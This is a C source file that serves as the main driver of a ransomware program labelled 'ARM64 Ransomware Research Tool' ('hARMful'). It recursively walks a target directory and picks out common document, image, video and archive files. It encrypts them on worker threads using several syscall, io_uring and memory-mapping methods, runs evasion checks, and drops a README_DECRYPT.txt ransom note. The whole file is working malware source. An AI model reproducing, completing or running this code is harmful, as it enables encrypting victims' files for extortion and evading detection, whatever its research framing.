#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <dirent.h>
#include <sys/stat.h>
#include <errno.h>
#include <time.h>

#if defined(__aarch64__) || defined(__arm64__)
    #include "syscalls_arm64.h"
#elif defined(__x86_64__) || defined(__amd64__)
    #include "syscalls_x86_64.h"
#endif

#include "encryption.h"
#include "evasion.h"

#define MAX_THREADS 8
#define TARGET_EXTENSIONS_COUNT 10

// List of target file extensions to encrypt
static const char* target_extensions[] = {
    ".txt", ".doc", ".pdf", ".jpg", ".png", 
    ".mp4", ".zip", ".log", ".conf", ".data"
};

typedef struct {
    char filepath[PATH_MAX];
    encryption_method_t method;
    int thread_id;
} encrypt_task_t;

static volatile int files_processed = 0;
static volatile int files_encrypted = 0;
static volatile int files_failed = 0;

void* encrypt_worker(void* arg) {
    encrypt_task_t *task = (encrypt_task_t*)arg;
    int result = -1;
    //printf("[Thread %d] Processing: %s\n", task->thread_id, task->filepath);
    switch (task->method) {
        case METHOD_DIRECT_SYSCALL:
            result = encrypt_file_direct_syscall(task->filepath);
            break;
        case METHOD_IO_URING:
            result = encrypt_file_io_uring(task->filepath);
            break;
        case METHOD_PARTIAL:
            result = encrypt_file_partial_direct(task->filepath);
            break;
        case METHOD_MMAP_PAGES:
            result = encrypt_file_mmap_pages(task->filepath);
            break;
        case METHOD_IO_URING_SYSCALL:
            result = encrypt_file_io_uring_direct_syscall(task->filepath);
            break;
        case METHOD_IO_URING_SYSCALL_HYBRID:
            result = encrypt_file_hybrid_partial_iouring(task->filepath);
            break;
    }
    __sync_fetch_and_add(&files_processed, 1);
    if (result == 0) {
        __sync_fetch_and_add(&files_encrypted, 1);
       //printf("[Thread %d] ✓ Encrypted: %s\n", task->thread_id, task->filepath);
    } else {
        __sync_fetch_and_add(&files_failed, 1);
       //printf("[Thread %d] ✗ Failed: %s\n", task->thread_id, task->filepath);
    }
    
    free(task);
    return NULL;
}

int is_target_file(const char* filename) {
    const char* ext = strrchr(filename, '.');
    if (!ext) return 0;
    
    for (int i = 0; i < TARGET_EXTENSIONS_COUNT; i++) {
        if (strcasecmp(ext, target_extensions[i]) == 0) {
            return 1;
        }
    }
    return 0;
}

int traverse_directory(const char* dir_path, encryption_method_t method,
                      pthread_t* threads, int* next_slot, int slot_active[]) {
    DIR *dir;
    struct dirent *entry;
    struct stat file_stat;
    char full_path[PATH_MAX];
    
    dir = opendir(dir_path);
    if (!dir) {
        perror("opendir");
        return -1;
    }
    
    while ((entry = readdir(dir)) != NULL) {
        // Skip . and ..
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) {
            continue;
        }
        
        // Build full path
        snprintf(full_path, sizeof(full_path), "%s/%s", dir_path, entry->d_name);
        
        if (stat(full_path, &file_stat) != 0) {
            continue;
        }
        
        if (S_ISDIR(file_stat.st_mode)) {
            traverse_directory(full_path, method, threads, next_slot, slot_active);
        } else if (S_ISREG(file_stat.st_mode) && is_target_file(entry->d_name)) {
            if (file_stat.st_size < 100 || file_stat.st_size > 100*1024*1024) {
                continue;
            }
            
            encrypt_task_t *task = malloc(sizeof(encrypt_task_t));
            if (!task) continue;

            strncpy(task->filepath, full_path, PATH_MAX - 1);
            task->filepath[PATH_MAX - 1] = '\0';
            task->method = method;
            task->thread_id = *next_slot;

            int slot = *next_slot;
            if (slot_active[slot]) {
                pthread_join(threads[slot], NULL);
                slot_active[slot] = 0;
            }

            if (pthread_create(&threads[slot], NULL, encrypt_worker, task) == 0) {
                slot_active[slot] = 1;
                *next_slot = (slot + 1) % MAX_THREADS;
            } else {
                free(task);
                perror("pthread_create");
            }
        }
    }
    
    closedir(dir);
    return 0;
}

// Create ransom note
void create_ransom_note(const char* directory) {
    char note_path[PATH_MAX];
    snprintf(note_path, sizeof(note_path), "%s/README_DECRYPT.txt", directory);
    
    FILE *note = fopen(note_path, "w");
    if (!note) return;
    
    fprintf(note, "=== It was hARMful ===\n\n");
    fprintf(note, "Your files have been encrypted.\n\n");
    fprintf(note, "- Timestamp: %ld\n", time(NULL));
    fprintf(note, "- Files processed: %d\n", files_processed);
    fprintf(note, "- Files encrypted: %d\n", files_encrypted);
    fprintf(note, "\n========================\n");
    
    fclose(note);
}

// Display usage information
void print_usage(const char* program_name) {
    printf("ARM64 Ransomware Research Tool\n");
    printf("Usage: %s [options] <target_directory>\n\n", program_name);
    printf("Options:\n");
    printf("  -m <method>  Encryption method (1-4):\n");
    printf("               1 = Direct syscalls\n");
    printf("               2 = io_uring\n");
    printf("               3 = Partial encryption\n");
    printf("               4 = Memory-mapped pages\n");
    printf("               5 = io_uring Direct syscall\n");
    printf("               6 = io_uring Hybrid Partial\n");
    printf("  -t <threads> Number of worker threads (1-%d)\n", MAX_THREADS);
    printf("  -h           Show this help\n\n");
    printf("Example: %s -m 3 -t 4 /tmp/test_files\n", program_name);
}

int main(int argc, char *argv[]) {
    encryption_method_t method = METHOD_DIRECT_SYSCALL;  // Default
    int max_threads = 4;
    char *target_directory = NULL;
    int opt;
    
    printf("hARMful\n");
    printf("=========================================\n\n");
    
    // Parse command line arguments
    while ((opt = getopt(argc, argv, "m:t:h")) != -1) {
        switch (opt) {
            case 'm':
                method = (encryption_method_t)atoi(optarg);
                if (method < 1 || method > 6) {
                    fprintf(stderr, "Invalid method. Use 1-4.\n");
                    return 1;
                }
                break;
            case 't':
                max_threads = atoi(optarg);
                if (max_threads < 1 || max_threads > MAX_THREADS) {
                    fprintf(stderr, "Invalid thread count. Use 1-%d.\n", MAX_THREADS);
                    return 1;
                }
                break;
            case 'h':
                print_usage(argv[0]);
                return 0;
            default:
                print_usage(argv[0]);
                return 1;
        }
    }
    
    if (optind >= argc) {
        fprintf(stderr, "Error: Target directory required.\n\n");
        print_usage(argv[0]);
        return 1;
    }
    
    target_directory = argv[optind];
    
    // Validate target directory
    struct stat dir_stat;
    if (stat(target_directory, &dir_stat) != 0 || !S_ISDIR(dir_stat.st_mode)) {
        fprintf(stderr, "Error: Invalid target directory: %s\n", target_directory);
        return 1;
    }
    
    if (evasion_checks() != 0) {
        fprintf(stderr, "Evasion checks failed. Exiting.\n");
        return 1;
    } 

    if (init_encryption_system(target_directory) != 0) {
        fprintf(stderr, "Error: Failed to initialize encryption system\n");
        return 1;
    }
    
    // Start timing
    struct timespec start_time, end_time;
    clock_gettime(CLOCK_MONOTONIC, &start_time);
    
    // Process files
    pthread_t threads[MAX_THREADS];
    int next_slot = 0;
    int slot_active[MAX_THREADS] = {0};

    traverse_directory(target_directory, method, threads, &next_slot, slot_active);

    for (int i = 0; i < MAX_THREADS; i++) {
        if (slot_active[i]) pthread_join(threads[i], NULL);
    }
    
    // Calculate timing
    clock_gettime(CLOCK_MONOTONIC, &end_time);
    double elapsed = (end_time.tv_sec - start_time.tv_sec) + 
                    (end_time.tv_nsec - start_time.tv_nsec) / 1000000000.0;
    
    // Create ransom note
    create_ransom_note(target_directory);
    
    printf("\n=== Encryption Complete ===\n");
    printf("Files processed: %d\n", files_processed);
    printf("Files encrypted: %d\n", files_encrypted);
    printf("Files failed: %d\n", files_failed);
    printf("Success rate: %.1f%%\n", 
           files_processed > 0 ? (100.0 * files_encrypted / files_processed) : 0.0);
    printf("Time elapsed: %.2f seconds\n", elapsed);
    printf("Ransom note created: %s/README_DECRYPT.txt\n", target_directory);
    
    cleanup_encryption_system();
    return 0;
}
